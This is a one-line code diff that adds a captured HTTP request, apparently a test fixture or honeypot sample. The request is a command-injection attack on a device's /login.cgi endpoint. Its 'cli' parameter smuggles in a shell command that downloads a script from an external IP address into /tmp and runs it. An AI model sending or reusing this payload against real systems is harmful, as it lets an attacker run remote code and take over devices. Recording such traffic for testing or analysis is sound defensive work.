@@ -1,0 +1,1 @@
+stream = [('in', b'GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1\x0d\x0aHost: 127.0.0.1\x0d\x0aConnection: keep-alive\x0d\x0aAccept-Encoding: gzip, deflate\x0d\x0aAccept: */*\x0d\x0aUser-Agent: Hello, World\x0d\x0a\x0d\x0a')]
